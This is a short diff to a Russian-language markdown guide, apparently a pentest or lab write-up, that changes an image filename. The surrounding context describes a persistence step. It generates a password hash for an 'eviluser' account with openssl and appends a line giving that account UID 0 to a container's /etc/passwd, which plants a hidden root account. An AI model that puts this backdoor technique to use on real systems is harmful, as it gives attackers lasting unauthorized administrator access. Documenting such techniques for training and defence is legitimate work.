@@ -52,7 +52,7 @@
 Таким образом также осуществляется закрепление в системе. Для этого необходимо проделать следующие шаги:
 * На своем хосте сгенирируем хэш пароля evilpass для пользователя eviluser командой `openssl passwd -1 -salt eviluser evilpassword`
 
-![generate password for eviluser](/pictures/pic4.png)
+![generate password for eviluser](/pictures/pic4_1.png)
 
 * Изменим внутри контейнера файл /etc/passwd используя nano `sudo nano /etc/passwd`. Добавим своего пользователя, добавив в конец файла строку: eviluser:$1$eviluser$eIaLEOmpQR3YjlJE1f/En.:0:0:/root/root:/bin/bash
 
